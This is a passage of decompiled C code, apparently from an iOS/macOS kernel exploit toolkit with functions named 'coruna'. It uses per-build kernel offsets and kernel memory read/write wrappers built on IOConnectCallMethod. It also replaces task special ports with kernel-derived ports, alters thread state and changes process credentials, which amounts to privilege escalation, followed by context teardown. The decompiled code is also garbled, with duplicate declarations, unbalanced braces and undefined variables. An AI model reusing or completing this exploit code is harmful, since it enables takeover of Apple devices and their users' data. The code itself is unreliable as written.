      }
      if (err < 0x1c1b) {
        off = 0x107;
        if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
          off = 0x10f;
        }
        err = coruna_kernel29bb0_via_ioconnectcallmethod(handle,off + handle,&thread_attr);
        if (err == 0) {
        return 0;
        }
        size = *(unsigned long *)(handle + 0x158);
        *bytes_3 = (thread_attr & 0xff) != 0;
        if (size < 0x1c1b0a80100000) {
        *buf = (thread_attr & 0xff00) != 0;
        thread_attr = thread_attr & 0xff0000;
        }
        else {
        *buf = (thread_attr & 0xff0000) != 0;
        thread_attr = thread_attr >> 0x18;
        }
        *data_2 = thread_attr != 0;
        return 1;
      }
      err = coruna_ctx_test_flag(handle,0x80000);
      err = err == 0;
      addr = 0x107;
      off = 0xff;
    }
    else {
      err = coruna_ctx_test_flag(handle,0x1180000);
      err = err == 0;
      addr = 0xbf;
      off = 0xb7;
    }
  }
  else {
    u = 0x1180000;
fail:
    err = coruna_ctx_test_flag(handle,u);
    err = err == 0;
    addr = 199;
    off = 0xbf;
  }
  if (!err) {
    off = addr;
  }
done:
  err = coruna_kernel29bb0_via_ioconnectcallmethod(handle,off + handle,&thread_attr);
  if (err == 0) {
    return 0;
  }
  size = *(unsigned long *)(handle + 0x158);
  *bytes_3 = (thread_attr & 0xff) != 0;
  if (size < 0x1c1b0a80100000) {
    *buf = (thread_attr & 0xff00) != 0;
    thread_attr = thread_attr & 0xff0000;
  }
  else {
    *buf = (thread_attr & 0xff0000) != 0;
    thread_attr = thread_attr >> 0x18;
  }
  *data_2 = thread_attr != 0;
  return 1;
}





unsigned long coruna_task_get_special_port_24e04(long arg,uint64_t val,uint64_t n)

{
  kern_return_t lk1;
  int err;
  unsigned long u;
  long addr;
  long serial_10;
  mach_port_t special_port;
  uint64_t cache_35;
  mach_port_t cache_37;
  
  lk1 = _task_get_special_port((task_t)val,2,&cache_37);
  if (lk1 == 0) {
    special_port = (mach_port_t)n;
    if (cache_37 == special_port) {
      return 1;
    }
    if (*(unsigned long *)(arg + 0x158) < 0x18090f00000000) {
      lk1 = _task_set_special_port((task_t)val,2,special_port);
      return (unsigned long)(lk1 == 0);
    }
    u = coruna_iosurface_field_read(arg);
    if ((int)u == 0) {
      return u;
    }
    addr = coruna_kernel29bb0_via_return_zero_1f078(arg,val);
    if (addr == 0) {
      return 0;
    }
    addr = addr + (u & 0xffffffff);
    u = coruna_kernel29bb0_trampoline_0001a670(arg,addr,&cache_35);
    if ((int)u == 0) {
      return u;
    }
    serial_10 = coruna_ptr_canonicalize(arg,cache_35);
    if (serial_10 == 0) {
      return 0;
    }
    if (special_port + 1 < 2) {
      serial_10 = -(unsigned long)(special_port == 0xffffffff);
    }
    else {
      serial_10 = coruna_ret_stub_2(arg,n);
      if (serial_10 == 0) {
        return 0;
      }
      err = coruna_kernel29bb0_via_kernel29bb0_via_kernel29bb0_via_ioconnectcallmethod_3(arg,serial_10);
      if (err != 0) goto load_ok_25;
    }
    err = coruna_call_mach_vm_machine_attribute_29df8_1aa8c(arg,addr,serial_10);
    u = (unsigned long)(err != 0);
  }
  else {
load_ok_25:
    u = 0;
  }
  return u;
}





void coruna_call_macho_data_seg_2bb24_2bdb4_24f38(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  coruna_mach_port_mod_refs_30670(val,id_2,0,size_3);
  return;
}





bool coruna_mach_port_mod_refs_30670(long handle,uint64_t val,long addr_2,ipc_space_t *arg)
{
  ipc_space_t task;
  pid_t lp1;
  kern_return_t lk2;
  int err;
  long handle;
  unsigned long u;
  long addr;
  uint64_t scratch;
  
  if ((0 < (int)val) && (lp1 = _getpid(), lp1 == (int)val)) {
    task = *(ipc_space_t *)k_kernel_mach_task_self_slot;
    lk2 = _mach_port_mod_refs(task,task,0,1);
    if (lk2 != 0) {
      return false;
    }
    *arg = task;
    return true;
  }
  err = *(int *)(&k_kernel_slot_191c + handle);
  if (err == 0) {
    err = *(int *)(&k_kernel_slot_1918 + handle);
  }
  handle = coruna_kernel29bb0_via_return_zero_1f078(handle,err);
  if (handle != 0) {
    if (addr_2 == 0) {
      handle = coruna_call_mach_vm_machine_attribute_29df8_1fa68(handle,handle,val);
    }
    else {
      handle = coruna_call_macho_data_seg_2bb24_2bdb4(handle,handle,addr_2);
    }
    if (handle != 0) {
      err = *(int *)(handle + 0x140);
      if (err < 0x2258) {
        if (err - 0x1f53U < 2) {
          u = 0x1f530f027fffff;
          addr = 0xd0;
        }
        else {
          u = 0x1c1b19145fffff;
          addr = 0xf0;
          if ((err != 0x1809) && (err != 0x1c1b)) {
            return false;
          }
        }
        if (*(unsigned long *)(handle + 0x158) <= u) {
          addr = 0xf8;
        }
      }
      else {
        addr = 200;
        if (((err != 0x2258) && (err != 0x225c)) && (err != 0x2712)) {
          return false;
        }
      }
      err = coruna_kernel29bb0_trampoline_0001a670(handle,addr + handle,&scratch);
      if ((err != 0) && (handle = coruna_ptr_canonicalize(handle,scratch), handle != 0)) {
        err = coruna_mach_port_deallocate_22af8(handle,scratch,arg);
        return err == 0;
      }
    }
  }
  return false;
}





bool coruna_thread_set_state(long handle,uint64_t val,uint64_t id_2,thread_state_flavor_t arg,
                 thread_state_t arg_x,mach_msg_type_number_t arg_x_x)
{
  int err;
  int status;
  kern_return_t lk3;
  long handle;
  long addr;
  ushort scratch;
  ushort bootargs;
  
  bootargs = 0;
  err = *(int *)(handle + 0x140);
  if (err < 0x225c) {
    handle = 0;
    lk3 = _thread_set_state((thread_act_t)id_2,arg,arg_x,arg_x_x);
    if ((0x225b < err) && (-1 < (short)bootargs)) {
    coruna_call_mach_vm_machine_attribute_29df8_1aa94(handle,handle,&bootargs,2);
    }
    return lk3 == 0;
  }
  status = coruna_ctx_test_flag(handle,0x4000000);
  if (status == 0) {
    status = coruna_ctx_test_flag(handle,0x5584201);
    addr = 0xb8;
    if (status != 0) {
      addr = 0x70;
    }
  }
  else {
    addr = 0xc0;
  }
  handle = coruna_kernel29bb0_via_return_zero_1f078(handle,id_2);
  if (handle != 0) {
    handle = handle + addr;
    status = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,handle,2,&bootargs);
    if (status != 0) {
      if (-1 < (short)bootargs) {
        scratch = bootargs | 0x8000;
        status = coruna_call_mach_vm_machine_attribute_29df8_1aa94(handle,handle,&scratch,2);
        lk3 = 5;
        return lk3 == 0;
      }
fail:
      lk3 = _thread_set_state((thread_act_t)id_2,arg,arg_x,arg_x_x);
      if ((0x225b < err) && (-1 < (short)bootargs)) {
        coruna_call_mach_vm_machine_attribute_29df8_1aa94(handle,handle,&bootargs,2);
      }
      return lk3 == 0;
    }
  }
done:
  lk3 = 5;
cleanup:
  return lk3 == 0;
}





uint64_t coruna_kernel29bb0_via_ctx_test_flag_5(long handle)
{
  bool err;
  int err;
  uint64_t u;
  int status;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    err = err - 0x1f53U < 2 || err == 0x1809;
    status = 0x1c1b;
  }
  else {
    err = err == 0x2258 || err == 0x2712;
    status = 0x225c;
  }
  u = 0;
  if (err || err == status) {
    err = coruna_ctx_test_flag(handle,0x20);
    if (err == 0) {
      err = coruna_ctx_test_flag(handle,8);
      u = 0xfffffff007004000;
      if (err != 0) {
        u = 0xfffffe0007004000;
      }
    }
    else {
      u = 0xfffffff027004000;
    }
  }
  return u;
}





uint64_t coruna_kernel29bb0_via_kernel29bb0_via_ioconnectcallmethod_8(long handle,int flags,uint size,char *path)
{
  long handle;
  int err;
  long addr;
  long off;
  uint64_t u;
  unsigned long size;
  uint scratch;
  int bootargs;
  long thread_attr;
  uint8_t host_info[512];
  long serial_buf;
  
  serial_buf = *(long *)k_kernel_stack_chk_guard_slot;
  u = 0x2800f;
  thread_attr = 0;
  addr = coruna_kernel29bb0_via_return_zero_1f078();
  if (addr == 0) {
    u = 0x2800e;
    if (*(long *)k_kernel_stack_chk_guard_slot != serial_buf) {
    ___stack_chk_fail();
    }
    return u;
  }
  if (*(int *)(handle + 0x140) == 0x1f53) {
    err = coruna_ctx_test_flag(handle,0x100000);
    if (err == 0) {
      err = coruna_ctx_test_flag(handle,0x5584001);
      off = 0x3d0;
      if (err != 0) {
        off = 1000;
      }
    }
    else {
      off = 0x3f8;
    }
  }
  else {
    if (*(int *)(handle + 0x140) != 0x1c1b) {
      u = 0x28007;
      if (*(long *)k_kernel_stack_chk_guard_slot != serial_buf) {
      ___stack_chk_fail();
      }
      return u;
    }
    size = *(unsigned long *)(handle + 0x158);
    err = coruna_ctx_test_flag(handle,0x5584001);
    off = 0x3c0;
    if (err != 0) {
      off = 0x3d0;
    }
    handle = 0x3c8;
    if (err != 0) {
      handle = 0x3e0;
    }
    if (0x1c1b19145fffff < size) {
      off = handle;
    }
  }
  off = off + addr;
  err = coruna_kernel29bb0_trampoline_0001a670(handle,off,&thread_attr);
  if (*(long *)k_kernel_stack_chk_guard_slot != serial_buf) {
  ___stack_chk_fail();
  }
  return u;
}
uint64_t coruna_kernel29bb0_via_call_mach_vm_machine_attribute_29df8_1aa94_4(long handle,uint64_t val)
{
  int err;
  long handle;
  long addr;
  long off;
  uint64_t u;
  long scratch;
  uint32_t bootargs;
  long thread_attr [18];
  long host_info;
  
  host_info = *(long *)k_kernel_stack_chk_guard_slot;
  u = 0x28010;
  scratch = 0;
  handle = coruna_helper_17db8_202d0();
  if (handle == 0) {
    u = 0x2800e;
  }
  else {
    err = *(int *)(handle + 0x140);
    if (err == 0x1809) {
      off = 0x2b8;
    }
    else if (err == 0x1f53) {
      off = 800;
    }
    else {
      if (err != 0x1c1b) {
        u = 0x28007;
        if (*(long *)k_kernel_stack_chk_guard_slot != host_info) {
        ___stack_chk_fail();
        }
        return u;
      }
      off = 0x2a0;
    }
    err = coruna_kernel29bb0_trampoline_0001a670(handle,off + handle,&scratch);
    if (err == 0) {
      u = 0x2800f;
    }
    else {
      if (scratch != 0) {
        addr = coruna_kernel29bb0_residual_161(handle);
        if (addr == 0) {
          u = 0x28026;
          if (*(long *)k_kernel_stack_chk_guard_slot != host_info) {
          ___stack_chk_fail();
          }
          return u;
        }
        thread_attr[0] = 0;
        err = coruna_kernel29bb0_via_return_zero_21bb4(handle,0xd,thread_attr);
        if (err == 0) {
          u = 0x28012;
          if (*(long *)k_kernel_stack_chk_guard_slot != host_info) {
          ___stack_chk_fail();
          }
          return u;
        }
        if (thread_attr[0] == 0) {
          bootargs = 0x80;
          thread_attr[0] = coruna_mach_port_allocate_2248c(handle,&bootargs);
          if (thread_attr[0] == 0) {
            u = 0xad009;
            if (*(long *)k_kernel_stack_chk_guard_slot != host_info) {
            ___stack_chk_fail();
            }
            return u;
          }
          thread_attr[0xe] = 0xffffffffffffffff;
          thread_attr[0xd] = 0xffffffffffffffff;
          thread_attr[0x10] = 0xffffffffffffffff;
          thread_attr[0xf] = 0xffffffffffffffff;
          thread_attr[10] = 0xffffffffffffffff;
          thread_attr[9] = 0xffffffffffffffff;
          thread_attr[0xc] = 0xffffffffffffffff;
          thread_attr[0xb] = 0xffffffffffffffff;
          thread_attr[6] = 0xffffffffffffffff;
          thread_attr[5] = 0xffffffffffffffff;
          thread_attr[8] = 0xffffffffffffffff;
          thread_attr[7] = 0xffffffffffffffff;
          thread_attr[2] = 0xffffffffffffffff;
          thread_attr[1] = 0xffffffffffffffff;
          thread_attr[4] = 0xffffffffffffffff;
          thread_attr[3] = 0xffffffffffffffff;
          err = coruna_call_mach_vm_machine_attribute_29df8_1aa94(handle,thread_attr[0],thread_attr + 1,0x80);
          if ((err == 0) || (err = coruna_kernel29bb0_via_call_mach_vm_machine_attribute_29df8_1aa94_3(handle,0xd,thread_attr[0]), err == 0))
          if (*(long *)k_kernel_stack_chk_guard_slot != host_info) {
          ___stack_chk_fail();
          }
          return u;
        }
        err = coruna_call_mach_vm_machine_attribute_29df8_1accc(handle,off + handle,thread_attr[0]);
        if (*(long *)k_kernel_stack_chk_guard_slot != host_info) {
        ___stack_chk_fail();
        }
        return u;
      }
      err = coruna_vm_read_write(val);
      if (err == 0) {
        u = 0x28003;
      }
      else {
        if (*(int *)k_kernel_mach_task_self_slot == (int)val) {
          coruna_ctx_set_flag(handle,0x8000000);
        }
        u = 0;
      }
    }
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot != host_info) {
    ___stack_chk_fail();
  }
  return u;
}
uint * coruna_ioregistryentrycreatecfproperty(long handle,int flags)
{
  uint u;
  uint8_t *ptr;
  uint8_t size;
  uint version;
  pid_t lp5;
  int err;
  mach_port_t lm7;
  host_priv_t host_priv;
  uint *buf;
  uint64_t port;
  long handle;
  long addr;
  long off;
  long base;
  void *ptr;
  unsigned long tag;
  uint *str;
  int status;
  int flags;
  uint *copy;
  void *buf;
  uint64_t kind;
  mach_port_t scratch;
  int bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t scratch;
  uint64_t bootargs;
  long serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  int stack_guard;
  size_t sa_saved;
  stat sa_new;
  long path_buf;
  
  path_buf = *(long *)k_kernel_stack_chk_guard_slot;
  action = 0;
  block_ctx = 0;
  scratch = 0;
  host_info = 0;
  serial_buf = 0;
  bootargs = 0;
  _local_150 = 0;
  thread_attr = 0;
  *(uint64_t *)(&k_kernel_slot_1930 + handle) = 0xffffffffffffffff;
  *(uint64_t *)(&k_kernel_slot_1938 + handle) = 0xffffffffffffffff;
  *(uint64_t *)(&k_kernel_slot_1940 + handle) = 0xffffffffffffffff;
  _mach_timebase_info((mach_timebase_info_t)(handle + 0x25c));
  _pthread_mutex_init((pthread_mutex_t *)(handle + 0x330),(pthread_mutexattr_t *)0x0);
  _pthread_mutex_init((pthread_mutex_t *)(handle + 0x268),(pthread_mutexattr_t *)0x0);
  ptr = k_kernel_mach_task_self_slot;
  version = _semaphore_create(*(task_t *)k_kernel_mach_task_self_slot,
                            (semaphore_t *)(handle + 0x264),0,0);
  buf = (uint *)(unsigned long)version;
  if (version != 0) {
fail:
    str = (uint *)(unsigned long)((uint)buf | 0x80000000);
    if (*(long *)k_kernel_stack_chk_guard_slot != path_buf) {
    ___stack_chk_fail(buf);
    }
    return str;
  }
  buf = (uint *)coruna_parse_libsyscall_version(&host_info,handle + 0x16c,handle + 0x170);
  if ((int)buf == 0) {
    str = (uint *)0xad015;
    if (*(long *)k_kernel_stack_chk_guard_slot != path_buf) {
    ___stack_chk_fail(buf);
    }
    return str;
  }
  *(uint64_t *)(handle + 0x148) = scratch;
  *(uint64_t *)(handle + 0x140) = host_info;
  *(long *)(handle + 0x158) = serial_buf;
  *(uint64_t *)(handle + 0x150) = bootargs;
  *(uint64_t *)(handle + 0x160) = action;
  *(uint32_t *)(handle + 0x168) = 8;
  copy = (uint *)0x28007;
  str = copy;
  if (*(long *)k_kernel_stack_chk_guard_slot != path_buf) {
  ___stack_chk_fail(buf);
  }
  return str;
}





bool coruna_kernel29bb0_via_call_mach_vm_machine_attribute_29df8_1aa94_5(long handle)
{
  int err;
  int status;
  long handle;
  uint64_t u;
  long addr;
  uint size;
  unsigned long version;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint host_info;
  long serial_buf;
  
  version = *(unsigned long *)(handle + 0x158);
  handle = coruna_kernel29bb0_via_return_zero_1f078();
  if (handle != 0) {
    status = 0x30;
    if (version < 0x18090a09600000) {
      status = 0x38;
    }
    err = *(int *)(handle + 0x140);
    if (err < 0x2258) {
      if (err - 0x1f53U < 2) {
        addr = 0x310;
        if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
          addr = 0x338;
        }
        size = 0x160;
      }
      else if (err == 0x1809) {
        size = status * 10;
        addr = 0x328;
      }
      else {
        if (err != 0x1c1b) {
          return false;
        }
        addr = 0x340;
        if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
          addr = 0x338;
        }
        size = status * 10;
      }
    }
    else {
      size = 0x160;
      addr = 0x308;
      if (((err != 0x2258) && (err != 0x225c)) && (err != 0x2712)) {
        return false;
      }
    }
    status = coruna_kernel29bb0_trampoline_0001a670(handle,addr + handle,&serial_buf);
    if ((status != 0) && (handle = coruna_ptr_canonicalize(handle,serial_buf), handle != 0)) {
      handle = serial_buf + (unsigned long)size;
      addr = handle + 0x18;
      status = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,addr,4,&host_info);
      if ((status != 0) && ((host_info & 1) != 0)) {
        thread_attr = 0x7fffffffffffffff;
        status = coruna_call_mach_vm_machine_attribute_29df8_1aa94(handle,handle + 0x20,&thread_attr,8);
        if (status != 0) {
          if (version < 0x18090a09600000) {
            bootargs = 0x7fffffffffffffff;
            handle = handle + 0x28;
            u = 8;
          }
          else {
            bootargs = coruna_cat(bootargs,0xffff);
            handle = handle + 0x1c;
            u = 2;
          }
          status = coruna_call_mach_vm_machine_attribute_29df8_1aa94(handle,handle,&bootargs,u);
          if (status != 0) {
            host_info = host_info & 0xffffcb0f;
            status = coruna_call_mach_vm_machine_attribute_29df8_1aa94(handle,addr,&host_info,4);
            if (status != 0) {
              scratch = 0;
              handle = 0x28;
              if (version < 0x18090a09600000) {
                handle = 0x30;
              }
              status = coruna_call_mach_vm_machine_attribute_29df8_1aa94(handle,addr + handle,&scratch,8);
              return status != 0;
            }
          }
        }
      }
    }
  }
  return false;
}





uint64_t coruna_kernel29bb0_via_kernel09_via_vm_allocate(uint64_t *val,uint size)
{
  int err;
  void *ptr;
  uint64_t u;
  
  ptr = _calloc(0x1d60,1);
  if (ptr == (void *)0x0) {
    u = 0xad009;
  }
  else {
    u = coruna_ioregistryentrycreatecfproperty(ptr,~size & 1);
    if ((int)u == 0) {
      err = coruna_msu_statfs_probe(ptr,(long)ptr + 600);
      if (err != 0) {
        *val = ptr;
        coruna_kernel09_via_vm_allocate(ptr);
        return 0;
      }
      coruna_kernel09_via_vm_allocate(ptr);
      u = 0x28021;
    }
    _free(ptr);
  }
  return u;
}





void coruna_kernel09_via_vm_allocate(long handle)
{
  void (*ptr)(void);
  unsigned long unaff_x30;
  
  if (*(long *)(&k_kernel_slot_19f8 + handle) != 0) {
    coruna_vm_allocate();
  }
  if (*(long *)(&k_kernel_slot_1d18 + handle) != 0) {
    coruna_vm_allocate();
  }
  if (*(long *)(&k_kernel_slot_1d20 + handle) != 0) {
    coruna_vm_allocate();
  }
  if (*(long *)(&k_kernel_slot_1d28 + handle) != 0) {
    coruna_vm_allocate();
  }
  if (*(long *)(&k_kernel_slot_1d30 + handle) != 0) {
    coruna_vm_allocate();
  }
  if (*(long *)(&k_kernel_slot_1d38 + handle) != 0) {
    if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
    coruna_vm_allocate();
    return;
  }
  return;
}





void coruna_call_plist_dict_36818(uint64_t val,uint64_t id_2)
{
  uint64_t in_stack_00000000;
  
  coruna_plist_dict(val,id_2,in_stack_00000000);
  return;
}





uint coruna_plist_dict(long handle,unsigned long arg,uint *size)
{
  uint8_t u;
  uint size;
  bool err;
  int err;
  int status;
  mach_port_t lm6;
  uint version;
  kern_return_t lk8;
  uint port;
  long handle;
  int *err;
  uint *ptr;
  unsigned long tag;
  uint64_t extraout_x1;
  uint64_t kind;
  uint64_t type_id;
  uint64_t type_id_8;
  uint type_id_9;
  long addr;
  uint type_id_10;
  uint type_id_11;
  long off;
  uint type_id_12;
  uint64_t scratch;
  int bootargs;
  uint thread_attr;
  
  ptr = (uint *)&scratch;
  port = 0xad008;
  version = 0xad008;
  type_id_11 = 0xad008;
  type_id_9 = 0xad001;
  if (((arg >> 0x1e & 3) != 0) && (size == (uint *)0x0)) {
    return 0xad001;
  }
  *(uint64_t *)(&UNK_000018c0 + handle) = 0;
  *(uint64_t *)(&k_kernel_slot_18b8 + handle) = 0;
  coruna_mach_absolute_time(handle);
  type_id_12 = (uint)arg;
  size = type_id_12 >> 8 & 0xff;
  type_id_10 = (uint)size;
  if (size == 1) {
    status = 0;
    scratch = coruna_u64_pack((scratch), (type_id_10));
    thread_attr = 0;
    if ((int)type_id_12 < 0x109) {
      if (type_id_12 == 0x80000108) {
        bootargs = 0x400;
        status = coruna_msu_mnt1_path(handle,size + 4,&bootargs,&thread_attr);
        if (status == 0) {
          status = 0;
          version = 0;
          }
          check_ok:
          err = status == 0;
          }
          type_id_9 = 0x28003;
          if (!(bool)(version == 0 & err)) {
          type_id_9 = version;
          }
          coruna_kernel09_via_vm_allocate(handle);
          return type_id_9;
          }
          type_id_9 = 0xad008;
          coruna_kernel09_via_vm_allocate(handle);
          return type_id_9;
  }
  type_id_9 = 0xad008;
  coruna_kernel09_via_vm_allocate(handle);
  return type_id_9;
}





uint64_t coruna_mach_thread_self(long handle)
{
  int err;
  mach_port_t lm2;
  mach_port_t lm3;
  uint u;
  uint64_t size;
  uint scratch;
  
  size = 0x2801f;
  *(uint64_t *)(&UNK_000018c0 + handle) = 0;
  *(uint64_t *)(&k_kernel_slot_18b8 + handle) = 0;
  coruna_mach_absolute_time();
  err = coruna_ctx_test_flag(handle,0x400);
  if (err != 0) {
    scratch = 0;
    err = coruna_msu_statfs_probe(handle,&scratch);
    if (err == 0) {
      return 0x28020;
    }
    if (scratch != 3) {
      u = *(uint *)(handle + 600);
      if (1 < u) {
        if (u != 3) {
          return 0x28020;
        }
        u = 0;
      }
      if ((scratch != u) && (err = coruna_chown_rmdir(handle), err == 0)) {
        return 0x28020;
      }
    }
  }
  err = coruna_ctx_test_flag(handle,4);
  if (((err == 0) || (err = coruna_kernel29bb0_via_ctx_test_flag_2(handle,0), err != 0)) &&
     ((*(long *)(&k_kernel_slot_1900 + handle) == 0 ||
      (err = coruna_task_info_249e8(handle,*(uint32_t *)k_kernel_mach_task_self_slot,2,
                            &k_kernel_slot_1908 + handle,8), err != 0)))) {
    lm3 = *(mach_port_t *)(&k_kernel_slot_192c + handle);
    if ((1 < lm3 + 1) && (lm2 = _mach_thread_self(), lm3 == lm2)) {
      lm3 = _mach_thread_self();
      err = coruna_kernel29bb0_via_kernel29bb0_via_ioconnectcallmethod_9(handle,lm3,0);
      if (err == 0) {
        return 0x2801f;
      }
    }
    if (((*(int *)(&k_kernel_slot_1910 + handle) == 0 && *(int *)(&k_kernel_slot_1914 + handle) == 0) ||
        (err = coruna_getuid(handle,*(int *)(&k_kernel_slot_1910 + handle),
                              *(int *)(&k_kernel_slot_1914 + handle),0), err != 0)) &&
       ((lm3 = _mach_host_self(), lm3 == *(mach_port_t *)(&k_kernel_slot_1928 + handle) ||
        ((err = coruna_ctx_test_flag(handle,0x10), err != 0 ||
         (err = coruna_task_get_special_port_24e04(handle,*(uint32_t *)k_kernel_mach_task_self_slot,
                               *(uint32_t *)(&k_kernel_slot_1928 + handle)), err != 0)))))) {
      coruna_kernel09_via_vm_allocate(handle);
      size = 0;
    }
  }
  return size;
}





uint64_t coruna_pthread_mutex_destroy(void *ctx)
{
  pthread_mutex_t *ptr;
  uint8_t *ptr;
  int err;
  uint64_t *buf;
  uint64_t *str;
  uint32_t scratch;
  
  coruna_kernel29bb0_trampoline_0000d080();
  coruna_kernel09_via_mach_port_allocate(ctx);
  if (*(void (**)((long)ctx + 0x1d0) != (void (*)0x0) {
    (**(void (**)((long)ctx + 0x1d0))(ctx);
  }
  ptr = k_kernel_mach_task_self_slot;
  if (1 < *(mach_port_name_t *)((long)ctx + 0x1918) + 1) {
    _mach_port_deallocate
              (*(ipc_space_t *)k_kernel_mach_task_self_slot,
               *(mach_port_name_t *)((long)ctx + 0x1918));
  }
  if ((((*(int *)((long)ctx + 0x1938) != -1) || (*(int *)((long)ctx + 0x193c) != -1)) ||
      (*(int *)((long)ctx + 0x1930) != -1)) ||
     ((*(int *)((long)ctx + 0x1934) != -1 || (*(int *)((long)ctx + 0x1940) != -1)))) {
    scratch = 0xffffffff;
    err = coruna_open_dev_null(&scratch);
    if (err == 0) {
      if (*(int *)((long)ctx + 0x1938) != -1) {
        _close(*(int *)((long)ctx + 0x1938));
        *(uint32_t *)((long)ctx + 0x1938) = 0xffffffff;
      }
      if (*(int *)((long)ctx + 0x193c) != -1) {
        _close(*(int *)((long)ctx + 0x193c));
        *(uint32_t *)((long)ctx + 0x193c) = 0xffffffff;
      }
      if (*(int *)((long)ctx + 0x1940) != -1) {
        _close(*(int *)((long)ctx + 0x1940));
        *(uint32_t *)((long)ctx + 0x1940) = 0xffffffff;
      }
      if (*(int *)((long)ctx + 0x1930) != -1) {
        _close(*(int *)((long)ctx + 0x1930));
        *(uint32_t *)((long)ctx + 0x1930) = 0xffffffff;
      }
      if (*(int *)((long)ctx + 0x1934) != -1) {
        _close(*(int *)((long)ctx + 0x1934));
        *(uint32_t *)((long)ctx + 0x1934) = 0xffffffff;
      }
      coruna_close(scratch);
    }
  }
  if (*(long *)((long)ctx + 0x28) != 0) {
    coruna_semaphore_destroy(ctx,1);
  }
  if (*(long *)((long)ctx + 0x1d48) != 0) {
    scratch = 0xffffffff;
    err = coruna_open_dev_null(&scratch);
    if (err == 0) {
      coruna_vm_deallocate_1d60c(ctx);
      coruna_close(scratch);
    }
  }
  if (1 < *(int *)((long)ctx + 0x5c) + 1U) {
    scratch = 0xffffffff;
    err = coruna_open_dev_null(&scratch);
    if (err == 0) {
      coruna_mach_port_deallocate_1d418(ctx);
      coruna_close(scratch);
    }
  }
  if (1 < *(int *)((long)ctx + 0xac) + 1U) {
    scratch = 0xffffffff;
    err = coruna_open_dev_null(&scratch);
    if (err == 0) {
      coruna_pthread_from_mach_thread_np_1d4a4(ctx);
      coruna_close(scratch);
    }
  }
  coruna_helper_10384_18e34(ctx);
  _mach_port_deallocate(*(ipc_space_t *)ptr,*(mach_port_name_t *)((long)ctx + 0x1920));
  if (1 < *(mach_port_name_t *)((long)ctx + 0x1924) + 1) {
    _mach_port_deallocate(*(ipc_space_t *)ptr,*(mach_port_name_t *)((long)ctx + 0x1924));
  }
  if (1 < *(int *)((long)ctx + 0x10) + 1U) {
    _IOObjectRelease();
  }
  if (1 < *(int *)((long)ctx + 0x18d8) + 1U) {
    *(uint32_t *)((long)ctx + 0x18d8) = 0;
  }
  if ((*(vm_address_t *)((long)ctx + 0x118) != 0) &&
     (*(vm_size_t *)((long)ctx + 0x120) != 0)) {
    _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)((long)ctx + 0x118),
                   *(vm_size_t *)((long)ctx + 0x120));
  }
  if (1 < *(semaphore_t *)((long)ctx + 0x264) + 1) {
    _semaphore_destroy(*(task_t *)ptr,*(semaphore_t *)((long)ctx + 0x264));
    *(uint32_t *)((long)ctx + 0x264) = 0;
  }
  ptr = (pthread_mutex_t *)((long)ctx + 0x330);
  err = _pthread_mutex_lock(ptr);
  if (err == 0) {
    buf = *(uint64_t **)((long)ctx + 0x370);
    *(uint64_t *)((long)ctx + 0x370) = 0;
    while (buf != (uint64_t *)0x0) {
      if (1 < *(mach_port_name_t *)((long)buf + 0x1c) + 1) {
        _mach_port_mod_refs(*(ipc_space_t *)ptr,*(mach_port_name_t *)((long)buf + 0x1c),1,-1);
      }
      str = (uint64_t *)*buf;
      buf[4] = 0;
      buf[1] = 0;
      *buf = 0;
      buf[3] = 0;
      buf[2] = 0;
      _free(buf);
      buf = str;
    }
    _pthread_mutex_unlock(ptr);
  }
  _pthread_mutex_destroy(ptr);
  _pthread_mutex_destroy((pthread_mutex_t *)((long)ctx + 0x268));
  if (*(long *)((long)ctx + 0x1d18) != 0) {
    coruna_kernel09_via_vm_deallocate_120b8();
    _free(*(void **)((long)ctx + 0x1d18));
    *(uint64_t *)((long)ctx + 0x1d18) = 0;
  }
  if (*(long *)((long)ctx + 0x1d20) != 0) {
    coruna_kernel09_via_vm_deallocate_120b8();
    _free(*(void **)((long)ctx + 0x1d20));
    *(uint64_t *)((long)ctx + 0x1d20) = 0;
  }
  if (*(long *)((long)ctx + 0x1d28) != 0) {
    coruna_kernel09_via_vm_deallocate_120b8();
    _free(*(void **)((long)ctx + 0x1d28));
    *(uint64_t *)((long)ctx + 0x1d28) = 0;
  }
  if (*(long *)((long)ctx + 0x1d30) != 0) {
    coruna_kernel09_via_vm_deallocate_120b8();
    _free(*(void **)((long)ctx + 0x1d30));
    *(uint64_t *)((long)ctx + 0x1d30) = 0;
  }
  if (*(long *)((long)ctx + 0x1d38) != 0) {
    coruna_kernel09_via_vm_deallocate_120b8();
    _free(*(void **)((long)ctx + 0x1d38));
    *(uint64_t *)((long)ctx + 0x1d38) = 0;
  }
  if (*(long *)((long)ctx + 0x1a00) != 0) {
    coruna_kernel09_via_vm_deallocate_120b8();
    _free(*(void **)((long)ctx + 0x1a00));
    *(uint64_t *)((long)ctx + 0x1a00) = 0;
  }
  if (*(long *)((long)ctx + 0x19f8) != 0) {
    coruna_kernel09_via_vm_deallocate_120b8();
    _free(*(void **)((long)ctx + 0x19f8));
    *(uint64_t *)((long)ctx + 0x19f8) = 0;
  }
  if (*(void **)((long)ctx + 0x1d10) != (void *)0x0) {
    _free(*(void **)((long)ctx + 0x1d10));
    *(uint64_t *)((long)ctx + 0x1d10) = 0;
    *(uint32_t *)((long)ctx + 0x1d08) = 0;
  }
  if (1 < *(mach_port_name_t *)((long)ctx + 0xe8) + 1) {
    _mach_port_deallocate(*(ipc_space_t *)ptr,*(mach_port_name_t *)((long)ctx + 0xe8));
    *(uint32_t *)((long)ctx + 0xe8) = 0;
  }
  _bzero(ctx,0x1d60);
  _free(ctx);
  return 0;
}





uint64_t coruna_kernel29bb0_via_kernel29bb0_via_ioconnectcallmethod_9(uint64_t val,uint64_t id_2,int flags)
{
  long handle;
  uint64_t u;
  uint size;
  uint scratch;
  
  handle = coruna_return_zero_2ccdc();
  u = 0;
